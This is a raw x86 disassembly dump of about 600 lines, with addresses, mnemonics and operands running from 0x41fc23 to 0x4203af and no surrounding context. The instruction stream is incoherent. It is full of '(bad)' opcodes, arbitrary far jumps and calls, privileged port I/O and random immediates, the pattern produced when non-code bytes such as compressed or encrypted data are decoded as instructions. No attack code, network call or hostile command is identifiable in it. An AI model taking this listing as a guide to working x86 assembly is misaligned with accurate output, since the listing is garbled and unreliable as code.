  41fc23:	sar    BYTE PTR [eax+0x5f],1
  41fc26:	test   eax,0x13f51b48
  41fc2b:	sub    edi,DWORD PTR [edx-0x3d]
  41fc2e:	stos   DWORD PTR es:[edi],eax
  41fc2f:	mov    bh,0xfd
  41fc31:	call   0x5be47470
  41fc36:	sti    
  41fc37:	and    ah,ah
  41fc39:	jno    0x41fc64
  41fc3b:	mov    dh,0x6a
  41fc3d:	rcl    DWORD PTR [ebx-0x4a49e7f4],cl
  41fc43:	leave  
  41fc44:	sbb    DWORD PTR [edx],eax
  41fc46:	add    edx,DWORD PTR [eax-0x27]
  41fc49:	jge    0x41fc40
  41fc4b:	sub    ebx,DWORD PTR [eax]
  41fc4d:	or     al,0x98
  41fc4f:	popa   
  41fc50:	add    dh,ch
  41fc52:	or     DWORD PTR [edi],edx
  41fc54:	retf   
  41fc55:	xchg   ecx,eax
  41fc56:	dec    esp
  41fc57:	push   0xffffff80
  41fc59:	sbb    BYTE PTR [eax+0x42],bl
  41fc5c:	popa   
  41fc5d:	or     BYTE PTR [ebx-0x6232d0d7],dh
  41fc63:	push   ebp
  41fc64:	push   esi
  41fc65:	int3   
  41fc66:	and    ah,0xf1
  41fc69:	cmp    ebp,DWORD PTR [ebx-0x54]
  41fc6c:	xor    al,0x5a
  41fc6e:	xchg   BYTE PTR [ecx+0x7eef7f23],bh
  41fc74:	fsub   QWORD PTR ds:0xdd529881
  41fc7a:	jo     0x41fc3b
  41fc7c:	xchg   ecx,eax
  41fc7d:	push   0x16
  41fc7f:	jb     0x41fc73
  41fc81:	sub    ecx,edi
  41fc83:	mov    esp,0xcba284b
  41fc88:	push   esi
  41fc89:	in     al,0xb1
  41fc8b:	out    dx,eax
  41fc8c:	jmp    edx
  41fc8e:	cmp    al,0x4b
  41fc90:	sub    al,0xbd
  41fc92:	push   esi
  41fc93:	(bad)  [ecx]
  41fc95:	push   ecx
  41fc96:	and    al,cl
  41fc98:	aad    0xb0
  41fc9a:	mov    WORD PTR [ebx+0x1b86751],gs
  41fca0:	mov    bl,0xc1
  41fca2:	push   ds
  41fca3:	xchg   esi,eax
  41fca4:	ja     0x41fc38
  41fca6:	in     eax,dx
  41fca7:	add    eax,0x5462c334
  41fcac:	popa   
  41fcad:	cld    
  41fcae:	sbb    cl,bl
  41fcb0:	ins    BYTE PTR es:[edi],dx
  41fcb1:	sbb    DWORD PTR [ebx],edx
  41fcb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcb4:	pop    ebp
  41fcb5:	pop    ds
  41fcb6:	pop    ss
  41fcb7:	and    al,0x5
  41fcb9:	dec    BYTE PTR [ecx+ebx*4+0x33]
  41fcbd:	ins    DWORD PTR es:[edi],dx
  41fcbe:	mov    edx,0x3d8af2d1
  41fcc3:	inc    edi
  41fcc4:	sub    ecx,esi
  41fcc6:	arpl   sp,bp
  41fcc8:	jb     0x41fc5a
  41fcca:	fadd   DWORD PTR [eax-0x6]
  41fccd:	sbb    eax,DWORD PTR [ebp-0x4]
  41fcd0:	test   DWORD PTR [ecx-0x3ae6fd7f],edi
  41fcd6:	dec    edx
  41fcd7:	xchg   edx,eax
  41fcd8:	mov    edx,0xa86f01c5
  41fcdd:	pop    edx
  41fcde:	sub    al,0x3c
  41fce0:	dec    esi
  41fce1:	push   cs
  41fce2:	sar    BYTE PTR [eax-0x77],1
  41fce5:	push   es
  41fce6:	imul   esi,DWORD PTR [ebx-0x21b3a523],0x35b3769f
  41fcf0:	or     BYTE PTR [eax+ebx*4],dl
  41fcf3:	fnstsw WORD PTR [ecx+edi*1]
  41fcf6:	int    0xd4
  41fcf8:	push   ebp
  41fcf9:	in     al,0x38
  41fcfb:	(bad)  
  41fcfc:	gs popa 
  41fcfe:	jnp    0x41fd62
  41fd00:	inc    ebx
  41fd01:	cld    
  41fd02:	shl    esp,1
  41fd04:	popf   
  41fd05:	jbe    0x41fd19
  41fd07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd08:	test   al,0xbb
  41fd0a:	xchg   edi,eax
  41fd0b:	(bad)  
  41fd0c:	bound  ebp,QWORD PTR [esi+ebp*8-0x5a]
  41fd10:	std    
  41fd11:	dec    ecx
  41fd12:	mov    edx,0xcf8d6f5e
  41fd17:	outs   dx,BYTE PTR ds:[esi]
  41fd18:	mov    al,ds:0xb58868bd
  41fd1d:	xor    ebx,DWORD PTR [edi+0xa]
  41fd20:	(bad)  
  41fd21:	ins    BYTE PTR es:[edi],dx
  41fd22:	jmp    0xf7f5:0xa7b94dc6
  41fd29:	bound  edi,QWORD PTR [esi-0x31]
  41fd2c:	or     edx,esp
  41fd2e:	hlt    
  41fd2f:	mov    esi,0x27233978
  41fd34:	mov    DWORD PTR [esi+0x2],ebp
  41fd37:	adc    ebx,edi
  41fd39:	pop    edi
  41fd3a:	pop    edx
  41fd3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd3c:	repz or cl,al
  41fd3f:	mov    bh,0x2d
  41fd41:	std    
  41fd42:	adc    cl,BYTE PTR [edx-0xd]
  41fd45:	inc    esp
  41fd46:	xchg   ebp,eax
  41fd47:	out    dx,eax
  41fd48:	cli    
  41fd49:	dec    ebx
  41fd4a:	sbb    eax,0x50b73566
  41fd4f:	lock mov al,0x58
  41fd52:	push   cs
  41fd53:	dec    ebx
  41fd54:	jg     0x41fdaf
  41fd56:	inc    ebp
  41fd57:	sub    ah,al
  41fd59:	xchg   ecx,eax
  41fd5a:	or     ah,ch
  41fd5c:	mov    eax,0xb54d1a3
  41fd61:	xchg   ecx,eax
  41fd62:	or     cl,BYTE PTR [edi]
  41fd64:	adc    DWORD PTR [ebp+0x322406fe],ebx
  41fd6a:	imul   edx,DWORD PTR [edx+0x71d95f3d],0xece30828
  41fd74:	or     dl,BYTE PTR [eax]
  41fd76:	mov    ch,BYTE PTR [esi+0x77]
  41fd79:	in     eax,dx
  41fd7a:	ja     0x41fd0b
  41fd7c:	adc    eax,0xeeb339ec
  41fd81:	jmp    0x1e45:0x820ed1a0
  41fd88:	jns    0x41fd28
  41fd8a:	popa   
  41fd8b:	loopne 0x41fe05
  41fd8d:	pushf  
  41fd8e:	ficom  WORD PTR ds:0x3a60188a
  41fd94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd95:	push   ebx
  41fd96:	sbb    BYTE PTR [ecx-0x6a],al
  41fd99:	shr    DWORD PTR [ebp-0x231c9a1c],0xdd
  41fda0:	sbb    BYTE PTR [ebx+0x66c3cbc],al
  41fda6:	bnd jl 0x41fd50
  41fda9:	jmp    0x41fd2d
  41fdab:	lods   eax,DWORD PTR ds:[esi]
  41fdac:	pop    DWORD PTR [ecx]
  41fdae:	push   eax
  41fdaf:	xor    BYTE PTR [edx+ecx*2+0x748772b2],bl
  41fdb6:	mov    ch,BYTE PTR [ebx]
  41fdb8:	rcl    DWORD PTR [ecx+ecx*2],cl
  41fdbb:	mov    edx,0x3bc26eeb
  41fdc0:	pop    ecx
  41fdc1:	std    
  41fdc2:	les    ebx,FWORD PTR [edi-0x2e9fc58b]
  41fdc8:	xchg   esi,eax
  41fdc9:	lock out 0x98,eax
  41fdcc:	dec    edx
  41fdcd:	cdq    
  41fdce:	aaa    
  41fdcf:	stc    
  41fdd0:	push   ecx
  41fdd1:	jb     0x41fe4d
  41fdd3:	jle    0x41fe17
  41fdd5:	std    
  41fdd6:	sahf   
  41fdd7:	aad    0x9a
  41fdd9:	jg     0x41fdf2
  41fddb:	scas   eax,DWORD PTR es:[edi]
  41fddc:	and    eax,0xfff872ef
  41fde1:	mul    BYTE PTR [edi]
  41fde3:	mov    ebx,DWORD PTR [esi-0x2aedcf25]
  41fde9:	scas   al,BYTE PTR es:[edi]
  41fdea:	mov    edi,0x3e22b569
  41fdef:	push   ebp
  41fdf0:	fs in  eax,0xd7
  41fdf3:	sub    BYTE PTR [edi],bh
  41fdf5:	shl    BYTE PTR es:[eax-0x1f],cl
  41fdf9:	or     esi,DWORD PTR [eax]
  41fdfb:	bound  esi,QWORD PTR [eax+0x77]
  41fdfe:	xor    eax,DWORD PTR [edx+0x7c21d155]
  41fe04:	(bad)  
  41fe05:	mov    ds:0x1439a538,eax
  41fe0a:	mov    esi,0x1642b2bf
  41fe0f:	add    BYTE PTR [edx],al
  41fe11:	add    ch,dl
  41fe13:	mov    dl,0x91
  41fe15:	sbb    esi,ebp
  41fe17:	pushf  
  41fe18:	int    0x61
  41fe1a:	pop    ecx
  41fe1b:	jbe    0x41fe2f
  41fe1d:	mov    edx,es
  41fe1f:	push   es
  41fe20:	test   BYTE PTR [esi-0x5a],bh
  41fe23:	or     al,0x35
  41fe25:	gs add al,0x41
  41fe28:	push   0xe819a026
  41fe2d:	enter  0x40ba,0x61
  41fe31:	sbb    esi,DWORD PTR [eax-0x5928ce84]
  41fe37:	pop    edi
  41fe38:	es mov ebp,0xc22f5231
  41fe3e:	fwait
  41fe3f:	xchg   ecx,eax
  41fe40:	ja     0x41fe19
  41fe42:	enter  0xb8c0,0xac
  41fe46:	push   ecx
  41fe47:	(bad)
  41fe4c:	dec    ebx
  41fe4d:	inc    eax
  41fe4e:	clc    
  41fe4f:	test   al,0x48
  41fe51:	push   esp
  41fe52:	mov    ebx,0x8ebf8ab7
  41fe57:	aaa    
  41fe58:	xor    esi,ebx
  41fe5a:	push   0xffffff92
  41fe5c:	out    0x86,eax
  41fe5e:	arpl   WORD PTR [ebx+0x2f],sp
  41fe61:	add    al,0x4c
  41fe63:	sub    edx,edx
  41fe65:	outs   dx,DWORD PTR ds:[esi]
  41fe66:	mov    esi,0x6470a08e
  41fe6b:	mov    ds:0x5b50ae00,al
  41fe70:	arpl   WORD PTR [esi-0x32172a3a],sp
  41fe76:	inc    eax
  41fe77:	push   ebp
  41fe78:	push   cs
  41fe79:	mov    BYTE PTR [esp+ecx*4],cl
  41fe7c:	dec    esi
  41fe7d:	adc    dh,BYTE PTR [ebx+0x495e7506]
  41fe83:	mov    ecx,0x4ed0adcc
  41fe88:	nop
  41fe89:	fs std 
  41fe8b:	mov    ch,0xc2
  41fe8d:	ss scas eax,DWORD PTR es:[edi]
  41fe8f:	cmp    eax,0x5b4fe27f
  41fe94:	xchg   ebp,eax
  41fe95:	xchg   ebp,eax
  41fe96:	sub    al,0x2d
  41fe98:	rcr    DWORD PTR [ebx+0x66],1
  41fe9b:	mov    ds:0x63a4cadd,eax
  41fea0:	and    bh,BYTE PTR [esi+edx*4+0x15]
  41fea4:	out    0xdf,eax
  41fea6:	retf   
  41fea7:	or     eax,0x6dbbf3c7
  41feac:	xchg   esp,eax
  41fead:	test   al,0xb1
  41feaf:	ins    BYTE PTR es:[edi],dx
  41feb0:	adc    al,0xf4
  41feb2:	mov    al,ds:0x933355da
  41feb7:	xor    DWORD PTR [edi-0x47],edx
  41feba:	and    BYTE PTR [edi],bh
  41febc:	sub    al,bl
  41febe:	jne    0x41fe6d
  41fec0:	dec    eax
  41fec1:	dec    DWORD PTR [ebp+0x46]
  41fec4:	(bad)  
  41fec5:	sar    BYTE PTR [edi+ebp*1+0x9],1
  41fec9:	imul   esp,edi,0xffffffa8
  41fecc:	mov    dl,0x7e
  41fece:	jmp    0x41fe8e
  41fed0:	imul   esi,DWORD PTR [edx],0xb56f8d29
  41fed6:	dec    ebp
  41fed7:	call   0x713127ea
  41fedc:	int3   
  41fedd:	dec    ecx
  41fede:	mov    ebx,0xfe07fcd0
  41fee3:	lods   eax,DWORD PTR ds:[esi]
  41fee4:	xchg   ebx,ebx
  41fee6:	cmp    al,0x6d
  41fee8:	or     al,0x88
  41feea:	loop   0x41fe83
  41feec:	lods   al,BYTE PTR ds:[esi]
  41feed:	and    al,al
  41feef:	sbb    eax,0x5d264744
  41fef4:	sub    al,0x83
  41fef6:	cli    
  41fef7:	xchg   edx,eax
  41fef8:	xchg   edi,eax
  41fef9:	js     0x41ff21
  41fefb:	ret    
  41fefc:	mov    bl,0x11
  41fefe:	mov    esp,0xfcff7e23
  41ff03:	jne    0x41ff68
  41ff05:	int3   
  41ff06:	mov    ah,BYTE PTR [eax-0x7]
  41ff09:	or     al,0x23
  41ff0b:	arpl   WORD PTR [esi],bp
  41ff0d:	enter  0x622,0x7d
  41ff11:	xchg   dl,ah
  41ff13:	adc    DWORD PTR [ebx+0x14],eax
  41ff16:	jae    0x41fec8
  41ff18:	mov    al,ds:0x51f7406c
  41ff1d:	sub    DWORD PTR [edx],edx
  41ff1f:	xchg   edx,ebp
  41ff21:	ss ja  0x41ff6d
  41ff24:	mov    edx,fs
  41ff26:	xchg   edx,eax
  41ff27:	dec    esp
  41ff28:	cmc    
  41ff29:	xchg   al,dl
  41ff2b:	add    DWORD PTR [esi],esp
  41ff2d:	lea    esi,[edx+0x68]
  41ff30:	sub    ebp,DWORD PTR [ebx-0x35]
  41ff33:	sub    DWORD PTR [edi],eax
  41ff35:	out    0x10,eax
  41ff37:	cdq    
  41ff38:	xchg   edx,eax
  41ff39:	clc    
  41ff3a:	fcmovnbe st,st(6)
  41ff3c:	mov    cl,0xab
  41ff3e:	dec    edi
  41ff3f:	scas   al,BYTE PTR es:[edi]
  41ff40:	retf   0xd8d9
  41ff43:	or     DWORD PTR [eax-0x68],ebx
  41ff46:	sbb    edx,edx
  41ff48:	cli    
  41ff49:	shl    BYTE PTR [ebp+ebp*8-0x36],0x63
  41ff4e:	jbe    0x41ff5c
  41ff50:	fild   QWORD PTR [esi+ecx*8+0x27]
  41ff54:	mov    eax,ds:0x5e459dd6
  41ff59:	pop    ebx
  41ff5a:	xchg   edi,eax
  41ff5b:	or     ebx,edx
  41ff5d:	adc    DWORD PTR [esi+0x39],esi
  41ff60:	push   edx
  41ff61:	out    dx,al
  41ff62:	lock popa 
  41ff64:	mov    ah,0x27
  41ff66:	inc    eax
  41ff67:	sar    DWORD PTR [ebx],0xec
  41ff6a:	in     al,0xda
  41ff6c:	daa    
  41ff6d:	pop    esi
  41ff6e:	mov    ebp,edx
  41ff70:	or     BYTE PTR [ebp+0x3963fbd5],al
  41ff76:	push   cs
  41ff77:	loopne 0x41ff73
  41ff79:	mov    dl,0xa7
  41ff7b:	sub    ebx,DWORD PTR [ebx-0x304e2f35]
  41ff81:	sub    eax,0x849d0838
  41ff86:	sbb    dh,BYTE PTR [edx]
  41ff88:	out    dx,al
  41ff89:	jle    0x41ff80
  41ff8b:	fimul  WORD PTR [edx]
  41ff8d:	push   edx
  41ff8e:	jp     0x41ff9e
  41ff90:	sbb    BYTE PTR [esi+ebp*1-0x7e],bh
  41ff94:	stos   BYTE PTR es:[edi],al
  41ff95:	mov    DWORD PTR [esi+0x5],edx
  41ff98:	jno    0x41ff34
  41ff9a:	jnp    0x41ff53
  41ff9c:	dec    esp
  41ff9d:	icebp  
  41ff9e:	pop    ecx
  41ff9f:	dec    edx
  41ffa0:	add    ebp,esp
  41ffa2:	scas   al,BYTE PTR es:[edi]
  41ffa3:	xor    BYTE PTR [edi+0x65df3fdb],ah
  41ffa9:	cmp    DWORD PTR [edx+ebx*2+0x4fce42b],ebx
  41ffb0:	stos   DWORD PTR es:[edi],eax
  41ffb1:	xor    ah,BYTE PTR [ebx]
  41ffb3:	(bad)  
  41ffb5:	imul   ecx,DWORD PTR [ebx],0x64
  41ffb8:	not    ebx
  41ffba:	cmp    BYTE PTR [eax-0x11aaacdc],ah
  41ffc0:	mov    ebp,0x73527006
  41ffc5:	pop    edx
  41ffc6:	cmc    
  41ffc7:	int3   
  41ffc8:	ins    BYTE PTR es:[edi],dx
  41ffc9:	leave  
  41ffca:	xor    bh,0x78
  41ffcd:	or     ebx,esi
  41ffcf:	mov    cl,0x6f
  41ffd1:	add    al,0xe8
  41ffd3:	sahf   
  41ffd4:	jmp    FWORD PTR [ecx]
  41ffd6:	push   cs
  41ffd7:	nop
  41ffd8:	add    al,0xbe
  41ffda:	sbb    BYTE PTR [ebx],bh
  41ffdc:	out    dx,al
  41ffdd:	add    eax,0xb090683b
  41ffe2:	scas   al,BYTE PTR es:[edi]
  41ffe3:	xor    eax,DWORD PTR [eax]
  41ffe5:	inc    ebx
  41ffe6:	shr    DWORD PTR [edi-0x18],cl
  41ffe9:	and    eax,0x6595a2a6
  41ffee:	push   eax
  41ffef:	xchg   ebp,eax
  41fff0:	xor    ah,ch
  41fff2:	fs std 
  41fff4:	sbb    BYTE PTR [eax],0xee
  41fff7:	cmp    al,0x9f
  41fff9:	adc    cl,BYTE PTR [eax+0x6074b9c1]
  41ffff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420000:	out    dx,eax
  420001:	ficom  DWORD PTR [edx-0x48]
  420004:	cli    
  420005:	ficomp WORD PTR [edx-0x7b]
  420008:	lds    edx,FWORD PTR [esi+0x891e87c]
  42000e:	loopne 0x41ffd8
  420010:	mov    ah,cl
  420012:	ins    BYTE PTR es:[edi],dx
  420013:	mov    ah,0x3c
  420015:	mov    ecx,0x59642237
  42001a:	mov    eax,ds:0x4ac45670
  42001f:	ror    DWORD PTR [ebx-0x33],cl
  420022:	xor    ch,ah
  420024:	cdq    
  420025:	rcr    DWORD PTR [esi],cl
  420027:	xor    eax,0xb98b57d6
  42002c:	push   ecx
  42002d:	loope  0x420060
  42002f:	sar    DWORD PTR [edi+0x41147fe8],0x79
  420036:	imul   eax,edx,0xffffffd2
  420039:	sbb    ecx,ebp
  42003b:	push   cs
  42003c:	pop    ebx
  42003d:	iret   
  42003e:	and    al,0x97
  420040:	cmp    al,0xa4
  420042:	push   esp
  420043:	outs   dx,DWORD PTR ds:[esi]
  420044:	jmp    0x4b8918b7
  420049:	pop    es
  42004a:	test   eax,0x20df7717
  42004f:	pushf  
  420050:	dec    ebp
  420051:	inc    edi
  420052:	ret    
  420053:	icebp  
  420054:	test   BYTE PTR [esi+edi*1],ch
  420057:	adc    ebx,DWORD PTR [ebp+esi*2-0x74]
  42005b:	(bad)  
  42005c:	xor    al,0xab
  42005e:	inc    edx
  42005f:	imul   eax,DWORD PTR [eax+0x41],0xfffffff2
  420063:	sahf   
  420064:	sub    eax,0xaf6808d8
  420069:	push   edi
  42006a:	cmc    
  42006b:	xor    al,0xcb
  42006d:	(bad)  
  42006e:	ds icebp 
  420070:	xchg   ecx,eax
  420071:	push   es
  420072:	inc    esi
  420073:	add    al,BYTE PTR [edx]
  420075:	push   si
  420077:	mov    ecx,0xc29b5f81
  42007c:	or     al,0x20
  42007e:	dec    ebp
  42007f:	cmp    dh,BYTE PTR [eax-0xcf7f608]
  420085:	cmp    ebp,DWORD PTR [ecx+0x2b]
  420088:	sub    al,0x6
  42008a:	fcomp  DWORD PTR [edi]
  42008c:	add    al,0x47
  42008e:	(bad)  [edx]
  420090:	rcr    ecx,cl
  420092:	xchg   esi,eax
  420093:	or     al,0xa9
  420095:	mov    ds:0x7120feef,al
  42009a:	and    al,0xed
  42009c:	jge    0x4200b5
  42009e:	mov    bl,0xd0
  4200a0:	mov    bh,0x57
  4200a2:	mov    BYTE PTR [esi],bh
  4200a4:	shr    DWORD PTR fs:[edx],0xf1
  4200a8:	mov    bl,0xcd
  4200aa:	add    edx,edx
  4200ac:	icebp  
  4200ad:	popa   
  4200ae:	dec    ebx
  4200af:	jne    0x4200f9
  4200b1:	xchg   BYTE PTR [ecx-0x3af5d1f2],cl
  4200b7:	shr    DWORD PTR [esi+0x618d8326],cl
  4200bd:	add    bl,BYTE PTR [ecx-0x5e]
  4200c0:	or     DWORD PTR [ebp-0x798f958b],esi
  4200c6:	xor    BYTE PTR [ebx+0x2455ad6f],dl
  4200cc:	not    BYTE PTR [ebp-0x2c]
  4200cf:	jbe    0x42006c
  4200d1:	mov    dl,0x78
  4200d3:	shl    DWORD PTR [esi+0x6d140665],1
  4200d9:	add    BYTE PTR [eax+0x536346e7],bh
  4200df:	dec    edi
  4200e0:	mov    bh,0x37
  4200e2:	cs ja  0x42013f
  4200e5:	shr    DWORD PTR [edi],1
  4200e7:	aad    0x75
  4200e9:	adc    eax,ecx
  4200eb:	out    dx,eax
  4200ec:	hlt    
  4200ed:	cmp    ecx,0x6a
  4200f0:	gs lock ror esi,cl
  4200f4:	sbb    eax,0x126c5d14
  4200f9:	sub    BYTE PTR [esi-0x74],bh
  4200fc:	push   es
  4200fd:	into   
  4200fe:	rcr    DWORD PTR [edx+0x4d],0xed
  420102:	popf   
  420103:	mov    esp,0x721fdca4
  420108:	mov    al,ds:0xe9009d7f
  42010d:	xor    edx,DWORD PTR [edx-0x5b]
  420110:	sar    DWORD PTR [ebx*4-0x68d00e7],1
  420117:	enter  0x3bcb,0x56
  42011b:	add    BYTE PTR [eax],ch
  42011d:	pop    ebp
  42011e:	mov    fs,WORD PTR [edi]
  420120:	mov    ecx,DWORD PTR [edi]
  420122:	(bad)  
  420123:	mov    ds:0x3e15fb6d,eax
  420128:	sar    BYTE PTR [edx+0x36bb07d8],cl
  42012e:	push   edi
  42012f:	pusha  
  420130:	mov    eax,0x4b1ada8c
  420135:	inc    edx
  420136:	xor    BYTE PTR [edi-0x17],0xce
  42013a:	test   BYTE PTR [esp+ebx*1],bl
  42013d:	sbb    esi,DWORD PTR [ebx+0x1c]
  420140:	jl     0x42019e
  420142:	mov    esi,0x2392a79
  420147:	and    al,0x7e
  420149:	test   eax,0xfe679fe6
  42014e:	xor    ah,dh
  420150:	mov    esi,0x3e827e69
  420155:	call   0xfca5:0x1a400561
  42015c:	test   eax,0xf9a03db3
  420161:	mov    BYTE PTR [ebx-0x27097a2],bh
  420167:	cmp    eax,0x359853d7
  42016c:	inc    edx
  42016d:	(bad)  
  42016e:	bound  ebx,QWORD PTR [ecx+0x61802a57]
  420174:	mov    ebp,0x25f209eb
  420179:	in     al,dx
  42017a:	repz int3 
  42017c:	jbe    0x42013b
  42017e:	dec    ecx
  42017f:	mov    ecx,0xfa04ade8
  420184:	xlat   BYTE PTR ds:[ebx]
  420185:	adc    eax,0xa61e6916
  42018a:	sbb    cl,ah
  42018c:	pop    ds
  42018d:	mov    dh,BYTE PTR [edi-0x4f4307d3]
  420193:	push   ds
  420194:	pusha  
  420195:	cmp    edi,DWORD PTR [ebx+0x38]
  420198:	cli    
  420199:	call   0x4ed7fe4b
  42019e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42019f:	sbb    BYTE PTR [edi+0x63a487e1],ch
  4201a5:	(bad)  
  4201a6:	arpl   dx,bx
  4201a8:	ret    
  4201a9:	mov    eax,0x2e60f5e9
  4201ae:	ins    BYTE PTR es:[edi],dx
  4201af:	or     DWORD PTR [ebx+edx*1],0xffffffa5
  4201b3:	popa   
  4201b4:	(bad)  
  4201b5:	ffree  st(7)
  4201b7:	push   ecx
  4201b8:	ds gs call 0x695dfa62
  4201bf:	mov    ds:0x798e526,eax
  4201c4:	cmp    dl,BYTE PTR [ecx+0x86ad7eb]
  4201ca:	aaa    
  4201cb:	or     bh,bl
  4201cd:	mov    es,ebx
  4201cf:	mov    ebp,0xe5ae5aa5
  4201d4:	sub    DWORD PTR [eax-0x5a3bd498],eax
  4201da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201db:	push   ss
  4201dc:	aas    
  4201dd:	add    BYTE PTR [ecx+edx*8-0xb58850b],cl
  4201e4:	pop    ds
  4201e5:	mov    al,0x47
  4201e7:	addr16 jnp 0x420208
  4201ea:	push   ds
  4201eb:	imul   edi,DWORD PTR [edi],0x21bd72f1
  4201f1:	js     0x420203
  4201f3:	xchg   ebp,eax
  4201f4:	push   ss
  4201f5:	stc    
  4201f6:	mov    esi,0xaa86f571
  4201fb:	mov    DWORD PTR [ebx+0xe37395a],ecx
  420201:	fdivrp st(0),st
  420203:	pop    edx
  420204:	push   edx
  420205:	xchg   ecx,eax
  420206:	ins    DWORD PTR es:[edi],dx
  420207:	pop    edi
  420208:	or     esi,0xf2044df8
  42020e:	and    al,0x85
  420210:	loope  0x420215
  420212:	ficomp DWORD PTR [ecx-0x5afb044]
  420218:	push   esi
  420219:	xor    eax,0x26ab9a88
  42021e:	aam    0x1
  420220:	inc    esp
  420221:	(bad)  
  420222:	shr    DWORD PTR [ecx+eax*8+0x2e],cl
  420226:	push   es
  420227:	int    0xbd
  420229:	adc    al,0x38
  42022b:	adc    esp,DWORD PTR [ebx]
  42022d:	dec    edi
  42022e:	mov    eax,ds:0x354feca5
  420233:	fisub  DWORD PTR [eax]
  420235:	or     eax,0x65a8ba59
  42023a:	repnz out 0x16,eax
  42023d:	mov    ah,0xda
  42023f:	dec    eax
  420240:	jl     0x420233
  420242:	outs   dx,BYTE PTR ds:[esi]
  420243:	ret    0x5f8f
  420246:	mov    ecx,0xab0199f5
  42024b:	pop    ecx
  42024c:	inc    edx
  42024d:	xor    al,BYTE PTR ds:0xbce5bf40
  420253:	das    
  420254:	enter  0xd18b,0x21
  420258:	or     ebx,DWORD PTR [ebx-0x33]
  42025b:	in     al,dx
  42025c:	ja     0x42022e
  42025e:	shl    ah,cl
  420260:	or     al,0x88
  420262:	add    BYTE PTR [eax+eiz*4-0x63],ch
  420266:	adc    ch,BYTE PTR [esi-0x31]
  420269:	push   0x7b
  42026b:	inc    ebx
  42026c:	xchg   edi,eax
  42026d:	lods   al,BYTE PTR ds:[esi]
  42026e:	xchg   edx,eax
  42026f:	lahf   
  420270:	add    dh,BYTE PTR [eax+ebp*2-0x10]
  420274:	clc    
  420275:	call   0x3bd1:0x908e0cfd
  42027c:	inc    edx
  42027d:	push   edx
  42027e:	fst    QWORD PTR [ecx-0x5f33281e]
  420284:	xor    edi,edx
  420286:	test   bh,cl
  420288:	loopne 0x420272
  42028a:	mov    eax,0x684eaf61
  42028f:	adc    DWORD PTR [ebx],0x2f
  420292:	jns    0x4202a8
  420294:	hlt    
  420295:	outs   dx,DWORD PTR ds:[esi]
  420296:	add    bh,BYTE PTR [ebx+0x70]
  420299:	inc    edi
  42029a:	or     ch,BYTE PTR [edi+0x4c]
  42029d:	outs   dx,DWORD PTR ds:[esi]
  42029e:	psrlq  mm2,QWORD PTR [eax-0x7a]
  4202a2:	adc    al,0x82
  4202a4:	retf   
  4202a5:	push   es
  4202a6:	dec    ebp
  4202a7:	mov    DWORD PTR [ecx+0x4d],ebx
  4202aa:	imul   esi,DWORD PTR [eax+0x11],0xdef5b403
  4202b1:	inc    edi
  4202b2:	mov    eax,ds:0x1bfb4d39
  4202b7:	aaa    
  4202b8:	and    BYTE PTR [eax],dh
  4202ba:	adc    eax,0x6ca45734
  4202bf:	jmp    0x8ce4:0xd9e11473
  4202c6:	outs   dx,DWORD PTR ds:[esi]
  4202c7:	pushf  
  4202c8:	test   eax,0xf794b465
  4202cd:	cmp    eax,0xd8d43679
  4202d2:	mov    esp,0xa7d436bd
  4202d7:	loopne 0x420280
  4202d9:	mov    WORD PTR [ebp-0x66685106],es
  4202df:	repz scas eax,DWORD PTR es:[edi]
  4202e1:	pop    ebp
  4202e2:	mov    fs,WORD PTR [ebp+0x7713543]
  4202e8:	add    eax,0x25592518
  4202ed:	sbb    DWORD PTR [ecx-0x71],esp
  4202f0:	out    dx,al
  4202f1:	in     eax,0x5a
  4202f3:	outs   dx,BYTE PTR ds:[esi]
  4202f4:	stos   DWORD PTR es:[edi],eax
  4202f5:	sbb    eax,0xed1b1eba
  4202fa:	retf   
  4202fb:	push   es
  4202fc:	and    al,0xad
  4202fe:	cmc    
  4202ff:	repnz sar BYTE PTR [ebp-0x7fb84026],cl
  420306:	dec    eax
  420307:	inc    edx
  420308:	push   eax
  420309:	dec    edi
  42030a:	cdq    
  42030b:	mov    esi,0xbaf097d1
  420310:	add    BYTE PTR [esi],bl
  420312:	dec    edi
  420313:	outs   dx,BYTE PTR ds:[esi]
  420314:	loopne 0x4202b6
  420316:	sbb    DWORD PTR [edi-0x22],0x576cda65
  42031d:	hlt    
  42031e:	cs mov esi,0x8f45cd22
  420324:	xadd   ecx,esi
  420327:	data16 adc BYTE PTR [ebp+0x4d89880f],0xbc
  42032f:	in     eax,0xf
  420331:	xchg   esi,eax
  420332:	jae    0x42036b
  420334:	scas   eax,DWORD PTR es:[edi]
  420335:	je     0x420387
  420337:	xchg   esp,eax
  420338:	jb     0x42035c
  42033a:	xor    al,BYTE PTR [eax-0x4a]
  42033d:	xchg   DWORD PTR [ecx+0x7505335e],ebp
  420343:	jbe    0x42030d
  420345:	xor    eax,DWORD PTR [edx]
  420347:	cmp    eax,0x931cf65f
  42034c:	(bad)  
  42034d:	and    BYTE PTR [ebx+ebx*4],bh
  420350:	retf   
  420351:	fldlg2 
  420353:	push   ebx
  420354:	in     eax,0x57
  420356:	stc    
  420357:	mov    edx,0x3604723e
  42035c:	into   
  42035d:	sbb    al,0xdb
  42035f:	inc    edi
  420360:	mov    ds:0x7fa4877b,eax
  420365:	add    ebp,ebx
  420367:	jmp    0x2ae894c
  42036c:	xchg   ebp,eax
  42036d:	adc    ch,BYTE PTR [edi-0x43]
  420370:	pop    ebp
  420371:	arpl   WORD PTR [edi+edi*4-0x1b],cx
  420375:	mov    ah,dl
  420377:	ins    DWORD PTR es:[edi],dx
  420378:	nop
  420379:	movaps XMMWORD PTR ds:0xf84a81b6,xmm0
  420380:	aaa    
  420381:	push   edi
  420383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420384:	mov    bl,dl
  420386:	mov    esi,0x4b640402
  42038b:	les    edx,FWORD PTR ds:0xa8315824
  420391:	and    DWORD PTR [edi+0x2c4520e4],edx
  420397:	inc    ebx
  420398:	sar    DWORD PTR [edx+0x431dbccb],1
  42039e:	or     eax,0x9e3319f0
  4203a3:	mov    al,ds:0x64101c61
  4203a8:	sub    DWORD PTR [ecx+0x31a37228],edi
  4203ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203af:	inc    edx
